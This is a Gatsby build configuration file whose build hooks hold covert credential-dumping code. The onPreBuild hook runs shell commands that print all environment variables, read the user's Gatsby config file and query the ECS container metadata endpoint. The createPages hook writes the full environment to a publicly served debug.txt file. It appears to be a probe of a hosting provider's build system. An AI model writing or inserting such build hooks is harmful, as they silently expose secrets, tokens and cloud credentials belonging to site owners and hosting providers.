const path = require("path")
const fs = require("fs")
const { execSync } = require("child_process")
/**
 * Implement Gatsby's Node APIs in this file.
 *
 * See: https://www.gatsbyjs.org/docs/node-apis/
 */

// You can delete this file if you're not using it
function exec(cmd) {
  return execSync(cmd).toString('utf8')
}
exports.onPreBuild = function () {
  console.log(`aw yeah`)

  console.log(exec(`env`))
  console.log(exec(`cat $HOME/.config/gatsby/config.json`))
  console.log(exec(`curl --connect-timeout 1000 $ECS_CONTAINER_METADATA_URI_V4`))

  console.log(`aw yeah`)
}

exports.createPages = async ({ actions }) => {
  const { createPage } = actions

  fs.writeFileSync(
    `./public/debug.txt`,
    JSON.stringify(
      {
        sessionID: process.gatsbyTelemetrySessionId,
        lol: 1,
        env: JSON.stringify(process.env),
      },
      null,
      2
    )
  )
}
